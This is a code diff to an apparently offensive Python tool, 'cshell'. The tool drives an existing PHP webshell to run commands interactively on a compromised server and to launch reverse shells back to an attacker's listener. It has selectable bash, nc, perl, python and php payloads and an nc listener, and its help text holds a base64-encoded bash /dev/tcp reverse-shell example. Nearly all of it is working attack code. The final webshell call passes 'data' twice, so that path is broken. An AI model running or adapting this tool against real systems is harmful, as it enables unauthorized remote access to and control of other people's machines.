@@ -17,6 +17,7 @@ from IPy import IP
 import textwrap
 import readline
 from subprocess import Popen
+import json
 
 
 blue = "\033[34m"                                                                                                                                                                          
@@ -126,35 +127,47 @@ def payload_list():
 
 
 #=================================================================================================================================================	
+# This function formats the command by replacing the WEB or REV
+#=================================================================================================================================================
+def type_replacer(typee , data , cmd):
+
+
+	data_return = {}
+	for key,value in data.items():
+		if typee in value:
+			data_return[key] = value.replace(typee , cmd)
+		else:
+			data_return[key]=value
+
+	return data_return
+
+
+
+
+#=================================================================================================================================================	
 # This function checks the avalibility of the target, if the target is reachable or not. and it also checks if the .php file is there or not
 #=================================================================================================================================================	
-def avalability_check(target , type , method , param , data):
+def avalability_check(target , type , method , data , headers , cookies , proxies ):
 	ainfo("Checking avalability of the Address")
 	splitted_target = list(map(str , target.split('/'))) # Splitts the .php file from the url example. 'cmd.php' from http://127.0.0.1/cmd.php
-
+	splitted_php_param = list(map(str, splitted_target[-1].split("?")))
 	try:
 		if method == "GET":
-			splitted_php_param = list(map(str, splitted_target[-1].split("?")))
-			r = requests.get(target.replace(type , 'id')) # Checks the availibility of the target by sending a get request
+			r = requests.get(target.replace(type , 'id') , headers=headers , cookies=cookies , proxies=proxies ) # Checks the availibility of the target by sending a get request
 		elif method == "POST":
-#			proxydict = {'http' : 'http://127.0.0.1:8080'}
-			data = {param : data.replace(type , 'id')}
-			r = requests.post(target , data=data)
+			data = type_replacer(type , data , 'id')
+			r = requests.post(target , data=data , headers=headers , cookies=cookies , proxies=proxies )
 		if r.status_code != 404: # Compares the status code to check the availability of the .php file
-			if method == "GET":
-				ainfo(f"Found : {splitted_php_param[0]}")
-			elif method == "POST":
-				ainfo(f"Found : {splitted_target[-1]}")
 			if 'uid' in r.text and 'gid' in r.text and 'groups' in r.text: #checks if uid, gid and groups are available on the response
 				ainfo("Testing command execution") 
 				return True
 			else:
 				aerr("Command exection failed.")
 				if method == "GET":
-					ainfo(f"Check : {splitted_php_param[0]}")
+					aerr(f"Check : {splitted_php_param[0]}")
 					aerr("Exitting...")
 				elif method == "POST":
-					ainfo(f"Check : {splitted_target[-1]}")
+					aerr(f"Check : {splitted_target[-1]}")
 					aerr("Exitting...")
 				return False
 				 # If target address and .php file is available it returns True
@@ -170,15 +183,16 @@ def avalability_check(target , type , method , param , data):
 #=================================================================================================================================================	
 # This function checks for the base of the payload example. 'bash' in bash -i /dev/tc..
 #=================================================================================================================================================	
-def payload_base_test(target , payloadtype , method , param, data ):
+def payload_base_test(target , payloadtype , method , data , headers , cookies , proxies):
 	payloadtype = list(map(str , payloadtype.split("-")))[0] #splits the payload base from the payloadtype as bash-196 which wlso uses bash, so we have to split bash-196 using '-' inorder to get the base
 	if method == "GET":
 		ainfo(f"Testing the avalability of {payloadtype} on the target")
-		r = requests.get(f"{target.replace('REV' ,f'which+{payloadtype}' )}")#sends a command 'which <payload base>', if the base is available on the host this returns the path of that host else if returns blank
+		r = requests.get(f"{target.replace('REV' ,f'which+{payloadtype}' )}" , headers=headers , cookies=cookies , proxies=proxies )#sends a command 'which <payload base>', if the base is available on the host this returns the path of that host else if returns blank
 	elif method == "POST":
 		ainfo(f"Testing the avalability of {payloadtype} on the target")
-		data = {param : data.replace("REV" , f"which {payloadtype}")}
-		r = requests.post(target , data)
+
+		data = type_replacer('REV' , data , f'which {payloadtype}')
+		r = requests.post(target , data , headers=headers , cookies=cookies , proxies=proxies )
 	if r.text != "": # This line checks if the response is not blank, if it blanks that means base isn't available
 		return True
 	else:
@@ -189,42 +203,44 @@ def payload_base_test(target , payloadtype , method , param, data ):
 #=================================================================================================================================================	
 # This function sends the payload 
 #=================================================================================================================================================	
-def send_payload(target , payload ,fmt , port , method, param ,data,nolstn=False):
-	try:
+def revshell(target  , ip ,fmt , port , method ,data,headers,cookies,proxies,nolstn=False):
+	info( "rev" , target , ip , port , fmt , 'rev')
+	if avalability_check(target  , "REV" , method , data , proxies=proxies , headers=headers , cookies=cookies) and payload_base_test(target , fmt , method  , data , proxies=proxies , headers=headers , cookies=cookies):
+		try:
+			payload = payloads(fmt , ip , port , method)
+			if method.upper() == "GET":
+				if nolstn:
+					try:
+						requests.get(target.replace("REV" ,  urllib.parse.quote_plus(payload)) , headers=headers , cookies=cookies , proxies=proxies , timeout=2)
+					except:
+						ap("Payload sent successfully")
+						sys.exit()
+				else:
+					ainfo("Starting the listener")
+					listener = Popen(["nc","-lvnp",port])
+					ainfo("Sending the payload. Good luck :)\n")
+					requests.get(target.replace("REV" , urllib.parse.quote_plus(payload)) , headers=headers , cookies=cookies , proxies=proxies )
+			elif method.upper() == "POST":
+				data = type_replacer('REV' , data , payload)
+				if nolstn:
+					try:
+						requests.post(target , data=data , timeout=2 , headers=headers , cookies=cookies , proxies=proxies )
+					except:
+						ap("Payload sent successfully")
+						sys.exit()
+				else:
+					ainfo("Starting listener")
+					listener = Popen(["nc","-lvnp",port])
+					ainfo("Sending payload. Good luck :)\n")
+					requests.post(target , data=data , headers=headers , cookies=cookies , proxies=proxies)
+		except KeyboardInterrupt:
+			print()
+			aerr("Exitting...")
+			listener.kill()
+			sys.exit()
 
-		if method.upper() == "GET":
-			if nolstn:
-				try:
-					requests.get(target.replace("REV" ,  urllib.parse.quote_plus(payload)) , timeout=2)
-				except:
-					ap("Payload sent successfully")
-					sys.exit()
-			else:
-				ainfo("Starting the listener")
-				Popen(["nc","-lvnp",port])
-				ainfo("Sending the payload. Good luck :)\n")
-				requests.get(target.replace("REV" , urllib.parse.quote_plus(payload)))
-		elif method.upper() == "POST":
-			data = {param : data.replace("REV" , payload) }
-			if nolstn:
-				try:
-					requests.post(target , data=data , timeout=2)
-				except:
-					ap("Payload sent successfully")
-					sys.exit()
-			else:
-				ainfo("Starting listener")
-				Popen(["nc","-lvnp",port])
-				ainfo("Sending payload. Good luck :)")
-				requests.post(target , data=data)
 
 
-
-
-	except KeyboardInterrupt:
-		print()
-		aerr("Exitting...")
-		sys.exit()
 #=================================================================================================================================================	
 # this functiion generates the payload
 #=================================================================================================================================================	
@@ -232,7 +248,7 @@ def payloads(fmt , ip , port , method):
 	port = str(port)
 	ainfo("Generating the Payload")
 	if fmt in list(payloads_dict.keys()): # This checks if the given format is available on the payload or not
-		payload =  payloads_dict.get(fmt).replace('\t' , '').replace("127.0.0.1" , ip).replace("1337" , str(port))
+		payload = payloads_dict.get(fmt).replace('\t' , '').replace("127.0.0.1" , ip).replace("1337" , str(port))
 		return payload
 	else:
 		aerr("Payload format not found")
@@ -290,62 +306,62 @@ def webshell_help(cmd=None):
 #	This function sends every command to the webshell
 #=================================================================================================================================================	
 
-def webshell(target ,method , param , data):
-	try:
-		ainfo("Use 'help' to see cshell-web commands")
-		ainfo("Spawning prompt..")
-		time.sleep(2)
-		raw_data = data
-		if method == "GET":
-			r = requests.get(target.replace('WEB' , "echo -n [OUTPUT_START][PWD_START]$(pwd)[PWD_END][HOSTNAME_START]$(hostname)[HOSTNAME_END][WHOAMI_START]$(whoami)[WHOAMI_END][OUTPUT_END]"))
-		elif method == "POST":
-			prompt_data = {param : data.replace("WEB" , "echo -n [OUTPUT_START][PWD_START]$(pwd)[PWD_END][HOSTNAME_START]$(hostname)[HOSTNAME_END][WHOAMI_START]$(whoami)[WHOAMI_END][OUTPUT_END]")}
-			r = requests.post(target , data=prompt_data)
-		prompt_request = list(map( str , r.text.split("\n")))
+def webshell(target ,method , param , data , headers , cookies , proxies):
+	info("web" , target)
+	if avalability_check(target , type="WEB" , method=method , data=data , cookies=cookies , proxies=proxies , headers=headers):
+		try:
+			ainfo("Use 'help' to see cshell-web commands")
+			ainfo("Spawning prompt..")
+			raw_data = data
+			if method == "GET":
+				r = requests.get(target.replace('WEB' , "echo -n [OUTPUT_START][PWD_START]$(pwd)[PWD_END][HOSTNAME_START]$(hostname)[HOSTNAME_END][WHOAMI_START]$(whoami)[WHOAMI_END][OUTPUT_END]") , headers=headers , cookies=cookies , proxies=proxies )
+			elif method == "POST":
+				prompt_data = type_replacer(typee='WEB' , data=data , cmd="echo -n [OUTPUT_START][PWD_START]$(pwd)[PWD_END][HOSTNAME_START]$(hostname)[HOSTNAME_END][WHOAMI_START]$(whoami)[WHOAMI_END][OUTPUT_END]")
+				r = requests.post(target , data=prompt_data , headers=headers , cookies=cookies , proxies=proxies )
+			prompt_request = list(map( str , r.text.split("\n")))
 
-		# Sample output : [OUTPUT_START][PWD_START]/home/test[PWD_END][HOSTNAME_START]ubuntu[HOSTNAME_END][WHOAMI_START]test[WHOAMI_END][OUTPUT_END]
-		for line in prompt_request:
-			if '[OUTPUT_START]' in line and '[OUTPUT_END]' in line:
-				pwd = line.split("[OUTPUT_START][PWD_START]")[1].split("[PWD_END][HOSTNAME_START]")[0]
-				hostname = line.split("[PWD_END][HOSTNAME_START]")[1].split("[HOSTNAME_END][WHOAMI_START]")[0]
-				whoami = line.split("[HOSTNAME_END][WHOAMI_START]")[1].split("[WHOAMI_END][OUTPUT_END]")[0]
-		readline.parse_and_bind('tab: complete')
-		readline.parse_and_bind('set editing-mode vi')
-		while 1:
-			try:
-				inpt = input(prompt(pwd , hostname , whoami)) #creaye prompt and asks for command
-				if webshell_help(inpt): # check if command matches the help
-					continue 
-				if method == "GET":
-					cmd = requests.utils.quote(f"echo -n [OUTPUT_START] && cd {pwd}&&{inpt} 2>&1 &&echo [PROMPT_START]$(pwd)[+]$(hostname)[+]$(whoami)[PROMPT_END][OUTPUT_END]") # sending 2>&1 with the prompt in order to get the error message 
-					res = requests.get(f"{target.replace('WEB' , cmd)}")
-				elif method == "POST":
-					cmd = f"echo -n [OUTPUT_START] && cd {pwd}&&{inpt} 2>&1 &&echo [PROMPT_START]$(pwd)[+]$(hostname)[+]$(whoami)[PROMPT_END][OUTPUT_END]"
-					value =  raw_data.replace("WEB" , cmd )
-					cmd_data = {param : value }
-					res = requests.post(target , data=cmd_data)
+			# Sample output : [OUTPUT_START][PWD_START]/home/test[PWD_END][HOSTNAME_START]ubuntu[HOSTNAME_END][WHOAMI_START]test[WHOAMI_END][OUTPUT_END]
+			for line in prompt_request:
+				if '[OUTPUT_START]' in line and '[OUTPUT_END]' in line:
+					pwd = line.split("[OUTPUT_START][PWD_START]")[1].split("[PWD_END][HOSTNAME_START]")[0]
+					hostname = line.split("[PWD_END][HOSTNAME_START]")[1].split("[HOSTNAME_END][WHOAMI_START]")[0]
+					whoami = line.split("[HOSTNAME_END][WHOAMI_START]")[1].split("[WHOAMI_END][OUTPUT_END]")[0]
+			readline.parse_and_bind('tab: complete')
+			readline.parse_and_bind('set editing-mode vi')
+			while 1:
+				try:
+					inpt = input(prompt(pwd , hostname , whoami)) #creaye prompt and asks for command
+					if webshell_help(inpt): # check if command matches the help
+						continue 
+					if method == "GET":
+						cmd = requests.utils.quote(f"echo -n [OUTPUT_START] && cd {pwd}&&{inpt} 2>&1 &&echo [PROMPT_START]$(pwd)[+]$(hostname)[+]$(whoami)[PROMPT_END][OUTPUT_END]") # sending 2>&1 with the prompt in order to get the error message 
+						res = requests.get(f"{target.replace('WEB' , cmd)}" , headers=headers , cookies=cookies , proxies=proxies )
+					elif method == "POST":
+						cmd = f"echo -n [OUTPUT_START] && cd {pwd}&&{inpt} 2>&1 &&echo [PROMPT_START]$(pwd)[+]$(hostname)[+]$(whoami)[PROMPT_END][OUTPUT_END]"
+						cmd_data = type_replacer('WEB' , data , cmd)
+						res = requests.post(target , data=cmd_data , headers=headers , cookies=cookies , proxies=proxies )
 
-				 # Replacing the web parameter with the cmd
-				# Filtering the response and sorting necessary responses
-				if "[OUTPUT_START]" in res.text and '[OUTPUT_END]' in res.text:
-					response = res.text.split("[OUTPUT_START]")[1].split('[OUTPUT_END]')[0].split("[PROMPT_START]")
-					output = str("".join(response[:1])).rstrip()
-					print ((output))
-					prompt_arr = list(map(str , response[1].split("[+]")))
-					pwd = pwd_filter(prompt_arr[0].rstrip())
-					hostname = prompt_arr[-2].rstrip()
-					whoami = prompt_arr[-1].rstrip().replace("[PROMPT_END]" , "")
-					
-				# incase of error this prints out
-				else:
-					print(f"{red}{res.text.rstrip().replace('[OUTPUT_START]' , '')}")
-			except KeyboardInterrupt:
-				print()
-				continue
-	except EOFError:
-		print()
-		aerr("Exitting...")
-		sys.exit()
+					 # Replacing the web parameter with the cmd
+					# Filtering the response and sorting necessary responses
+					if "[OUTPUT_START]" in res.text and '[OUTPUT_END]' in res.text:
+						response = res.text.split("[OUTPUT_START]")[1].split('[OUTPUT_END]')[0].split("[PROMPT_START]")
+						output = str("".join(response[:1])).rstrip()
+						print ((output))
+						prompt_arr = list(map(str , response[1].split("[+]")))
+						pwd = pwd_filter(prompt_arr[0].rstrip())
+						hostname = prompt_arr[-2].rstrip()
+						whoami = prompt_arr[-1].rstrip().replace("[PROMPT_END]" , "")
+						
+					# incase of error this prints out
+					else:
+						print(f"{red}{res.text.rstrip().replace('[OUTPUT_START]' , '')}")
+				except KeyboardInterrupt:
+					print()
+					continue
+		except EOFError:
+			print()
+			aerr("Exitting...")
+			sys.exit()
 
 #=================================================================================================================================================
 #	This function extracts ip address from the interface names
@@ -410,32 +426,41 @@ def main():
 	# reverse shell arguments
 	rev = subparsers.add_parser("rev" ,formatter_class=argparse.RawDescriptionHelpFormatter , description='''Description : It takes a working a webshell as an argument, executes the payload and returns a reverse shell on the listener.
 		''' )
-	rev.add_argument('-f', metavar='Format', type=str, required=False , default='bash' ,help='Reverse shell payload format. [Default - bash]')
+	rev.add_argument('-f', metavar='Format', type=str, required=False , choices=["bash-196","bash","bash-read-line","bash-5","nc-mkfifo","nc","nc-c","ncat-e","perl","php-exec","php-shell-exec","php-system","php-passthru","php-popen","python","python-export","python3","python3-export","ruby"], default='bash' ,help='Reverse shell payload format. Default - bash')
 	rev.add_argument('--nolstn' , action='store_true' , required=False , help="Don't start the listener" )
-	rev.add_argument('-p', metavar='Listening-Port' , required=False ,default=1337 ,type=int, help='Attacker\'s Port In which the reverse shell will be recived [Default - 1337]. Note : Port must be in-between 1 to 65535')
-	rev.add_argument('-m', metavar='method' , required=False ,default="GET" ,help='Method of sending the request, Example : GET, POST')
-	rev.add_argument('-d', metavar='Data' , required=False ,default='cmd=REV' , help='Data format of the Post request.(Send REV as a command), Example & Default Value : \'cmd=REV\'')
+	rev.add_argument('-p', metavar='Listening-Port' ,  choices=range(1,65535) , required=False ,default=1337 ,type=int, help='Attacker\'s Port In which the reverse shell will be recived [Default - 1337]. Note : Port must be in-between 1 to 65535')
+	rev.add_argument('-m', metavar='Method' , required=False ,default="GET" , choices=['GET' , 'POST'] ,help='Method of sending the request, Supports : GET, POST')
+	rev.add_argument('-d', metavar='Data' , required=False ,default='{"cmd" : "REV"}' , help='Add Data into the request (Send \'REV\' instead of the command). Example & Default Value : \'{"cmd" : "REV"}\'')
+	rev.add_argument('-H', metavar='Headers' , required=False ,default='{}' , help='Add Headers into the request (all the headers must be in JSON format). Example {\"Host\" : \"127.0.0.1\"}')
+	rev.add_argument('-c', metavar='Cookie' , required=False ,default='{}' , help='Add Cookies into the request (all the Cookies must be in JSON format). Example {\"PHPSESSID\" : \"1234567890abcdefghijkl\"}')
+	rev.add_argument('-x', metavar='Proxy' , required=False ,default='{}' , help='Proxy the request (all the Proxie must be in JSON format). Example {\"http\" : \"127.0.0.1:8080\"}')
+	
+
 
 	rev_required = rev.add_argument_group('required arguments')
 	rev_required.add_argument('-i', metavar='Listening-IP' , required=True , help='Attacker\'s IP or Interface name for reciving reverse shell')
 	rev_pos = rev.add_argument_group('positional arguments')
-	rev_pos.add_argument('target', metavar='Target', default="test", help='Full URL of the target, Add \'REV\' as a command on the parametr. Example: http://127.0.0.1/webshell.php?cmd=REV')
+	rev_pos.add_argument('Target', metavar='Target', default="test", help='Full URL of the target, Add \'REV\' as a command on the parametr. Example: http://127.0.0.1/webshell.php?cmd=REV')
 
 
 #+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 	# web shell arguments
 	web = subparsers.add_parser("web" , formatter_class=argparse.RawDescriptionHelpFormatter , description='Description : It takes a working reverse shell as an argument and executes command on that reverse shell in real time,\n\t      This also shows error message and persists the working directory')
-	web.add_argument('-m', metavar='method' , required=False ,default="GET" ,help='Method of sending the request, Example : GET, POST')
-	web.add_argument('-d', metavar='data' , required=False ,default='cmd=WEB' , help='Data format of the Post request. If multiple data needs to be send, seperate each data with \'&\'.(Send WEB as a command) , Example & Default Value : \'cmd=WEB\'')
+	web.add_argument('-m', metavar='Method' , required=False , choices=['GET' , 'POST'] ,default="GET" ,help='Method of sending the request, Supports : GET, POST')
+	web.add_argument('-d', metavar='Data' , required=False ,default='{"cmd" : "WEB"}' , help='Add Data into the request (Send \'WEB\' instead of the command). Example & Default Value : \'{"cmd" : "WEB"}\'')
+	web.add_argument('-H', metavar='Headers' , required=False ,default='{}' , help='Add Headers into the request (all the headers must be in JSON format). Example {\"Host\" : \"127.0.0.1\"}')
+	web.add_argument('-c', metavar='Cookie' , required=False ,default='{}' , help='Add Cookies into the request (all the Cookies must be in JSON format). Example {\"PHPSESSID\" : \"1234567890abcdefghijkl\"}')
+	web.add_argument('-x', metavar='Proxy' , required=False ,default='{}' , help='Proxy the request (all the Proxies must be in JSON format). Example {\"http\" : \"127.0.0.1:8080\"}')
+
 	web_required = web.add_argument_group('positional arguments')
-	web_required.add_argument('target',  metavar="Target" , help="Target URL with 'WEB' as a command. Example : http://127.0.0.1/webshell.php?cmd=WEB")
+	web_required.add_argument('Target',  metavar="Target" , help="Target URL with 'WEB' as a command. Example : http://127.0.0.1/webshell.php?cmd=WEB")
 
 
 #+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 	# listener Argument
 	lstn = subparsers.add_parser("lstnr" , formatter_class=argparse.RawDescriptionHelpFormatter , description='Description : It generates and copies whatever payload from the payload list [You can list all the payloads using \'--payloads\']. it also starts a listener [Optional].')
-	lstn.add_argument("-p" , metavar="Port" , required=False , default=1337 , help="Reverse shell's port. [Default : 1337]")
-	lstn.add_argument("-f" , metavar="Format" , required=False , default="bash" , help="Reverse shell's format. [Default : bash]")
+	lstn.add_argument("-p" , metavar="Port" , required=False , choices=range(1,65535) , default=1337 , help="Reverse shell's port. [Default : 1337]")
+	lstn.add_argument("-f" , metavar="Format" , choices=["bash-196","bash","bash-read-line","bash-5","nc-mkfifo","nc","nc-c","ncat-e","perl","php-exec","php-shell-exec","php-system","php-passthru","php-popen","python","python-export","python3","python3-export","ruby"] , required=False , default="bash" , help="Reverse shell's format. Default : bash")
 	lstn.add_argument("--nolstn" , action='store_true' , required=False , help="Start the listener")
 	lstn.add_argument("--b64" , action='store_true' , required=False , help="Encode the payload in base64 format. Example payload : echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvOTAwMSAwPiYxCg== | base64 -d | bash")
 	lstn.add_argument("-i" , metavar="Interface" , default='tun0', help="IP in which you want to send the reverse shell or you can specify the network interface. Example : -i 10.10.10.10 OR -i tun0, Default Value : \'tun0\'")
@@ -447,42 +472,20 @@ def main():
 #=====================================================================================================================================================
 
 	if args.command == "rev":
-			url = args.target
+			url = args.Target
 			ip = args.i
-			port = args.p
+			port = str(args.p)
 			fmt = args.f
 			nolstn = args.nolstn
 			method = args.m.upper()
-			data = args.d
-
-			if method == "GET" or method == "POST":
-				if method == "POST":
-					if "REV" in data:
-						if "&" in data:
-							data = data.split("&")
-							for each in data:
-								if "REV" in each:
-									splitted_data = each.split('=')
-									param = splitted_data[0]
-									data = splitted_data[1]
-						else:
-							splitted_data = data.split('=')
-							param = splitted_data[0]
-							data = splitted_data[1]
-
-					else:
-						aerr("\'REV\' not found on data")
-						sys.exit()
-				elif method == "GET":
-					if "REV" not in url: #check the rev word
-						aerr(f"\'REV\' not found on Target URL")
-						sys.exit()
-					else:
-						param = ""
+			data = json.loads(args.d)
+			headers = json.loads(args.H)
+			cookies = json.loads(args.c)
+			proxy = json.loads(args.x)
 
 
-			else:
-				aerr("Method not found , Available Methods = ['GET' , 'POST']")
+			if ('REV' not in url and method == 'GET') or ('REV' not in str(data) and method == "POST"):
+				aerr("\'REV\' not found on data or URL")
 				sys.exit()
 
 			try: 
@@ -491,59 +494,26 @@ def main():
 			except ValueError: # takes ip from interface
 				ip = get_ip_address(ip)
 
-
-			if fmt not in list(payloads_dict.keys()):
-				aerr("Format not found")
-				ainfo("Shifting to defaut format : bash")
-				fmt = "bash"
-			if port not in range(1 , 65536):
-				aerr("Port is out of range, expected between 1-65535")
-				aerr("Exitting...")
-				sys.exit()
-			info( "rev" , url , ip , port , fmt , 'rev')
-			if avalability_check(url  , "REV" , method , param , data) and payload_base_test(url , fmt , method , param , data):
-				send_payload(url , payloads(fmt , ip , port , method), fmt , str(port) , method , param, data, nolstn=nolstn)
+			revshell(url , ip=ip , port=port , fmt=fmt , method=method , data=data, proxies=proxy , headers=headers , cookies=cookies ,  nolstn=nolstn)
 
 #=====================================================================================================================================================
 
 
 	elif args.command == "web":
-		url = args.target
+		url = args.Target
 		method = args.m.upper()
-		data = args.d
+		data = json.loads(args.d)
+		headers = json.loads(args.H)
+		cookies = json.loads(args.c)
+		proxy = json.loads(args.x)
 
-		if method == "GET" or method == "POST":
-			if method == "GET":
-				if "WEB" not in url:			
-					aerr(f"\'WEB\' not found on Target URL")			
-					sys.exit()
-				else:
-					param = ""
-			elif method == "POST":
-				if "WEB" in data:
-					if '&' in data:
-						data = args.d.split("&")
-						for each in data:
-							if "WEB" in each:
-								splitted_data = each.split('=')
-								param = splitted_data[0]
-								data = splitted_data[1]
-					else:
-						splitted_data = data.split('=')
-						param = splitted_data[0]
-						data = splitted_data[1]
 
-				else:
-					aerr("\'WEB\' not found on data")
-					sys.exit()
-		else:
-			print(f"Method : \'{method}\' Not found. Available Methods ['GET' , 'POST']")
+		if ('WEB' not in url and method == 'GET') or ('WEB' not in str(data) and method == "POST"):
+			aerr("\'WEB\' not found on data or URL")
 			sys.exit()
 
 
-		info("web" , url)
-		if avalability_check(url , "WEB" , method , param , data):
-			webshell(url , method , param , data)
+		webshell(url , method , data , proxies=proxy , data=data , cookies=cookies , headers=headers )
 
 #=====================================================================================================================================================
 
@@ -563,3 +533,4 @@ def main():
 		myparser.print_help()
 
 #====================================================================< Function Ends Here >=================================================================================
+main()
